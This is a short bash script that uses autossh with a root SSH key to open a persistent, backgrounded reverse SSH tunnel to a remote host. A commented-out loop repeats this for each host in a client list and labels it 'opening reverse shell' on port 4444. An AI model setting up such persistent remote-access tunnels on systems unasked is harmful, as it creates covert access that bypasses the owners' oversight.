#!/bin/bash

identity_file=$1
#identity_file='/root/.ssh/id_rsa'
port=$2
rhost=$3
lport=$4
autossh_out=$5

autossh -M $autossh_out -o "PubKeyAuthentication=yes" -o "PasswordAuthentication=no" -i $identity_file -p $port -N -R "$lport:localhost:$lport"  "$rhost"  -f

#lport='4444'

#while read line
#do
#
#	rhost="$(echo $line | awk '{ print $1 }')"
#	port="$(echo $line | awk '{ print $2 }')"
#	autossh -M $autossh_out -o "PubKeyAuthentication=yes" -o "PasswordAuthentication=no" -i $identity_file -p $port -N -R "$lport:localhost:$lport"  "$rhost"  -f
#
#	echo "[*] Opening reverse shell from $line"
#
#	((autossh_out+=2))
#done < 'clients.txt'
